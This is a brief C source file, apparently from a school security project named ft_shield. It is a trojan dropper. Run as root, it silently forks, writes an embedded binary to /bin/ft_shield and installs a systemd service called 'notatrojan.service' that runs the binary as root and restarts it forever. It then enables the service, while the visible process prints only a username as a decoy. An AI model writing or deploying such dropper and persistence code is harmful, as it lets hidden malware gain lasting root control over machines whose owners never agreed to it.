#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <ft_shield.h>
#include <string.h>

#define NAME "/bin/ft_shield"

#define SERVICE						\
	"[Service]\n"					\
	"ExecStart=/bin/ft_shield\n"			\
	"Restart=always\n"				\
	"User=root\n"					\
	"\n"						\
	"[Install]\n"					\
	"WantedBy=multi-user.target\n"

#define SERVICE_NAME "/etc/systemd/system/notatrojan.service"

void create_file(char *name, char *content, int len) {
	int fd = open(name, O_WRONLY | O_TRUNC | O_CREAT, 0755);
	if (fd >= 0) {
		write(fd, content, len);
	}
}

int main() {
	if (getuid() == 0 && fork() == 0) {
		int fd = open("/dev/null", O_WRONLY);
		dup2(fd, 1);
		dup2(fd, 2);
		create_file(NAME, (char*)trojan, trojan_len);
		create_file(SERVICE_NAME, (char*)SERVICE, strlen(SERVICE));
		execve("/bin/systemctl", (char*[]){"/bin/systemctl",
											"enable",
											"notatrojan.service",
											NULL},
		NULL);
		exit(0);
	} else {
		printf("jcario\n");
	}
}
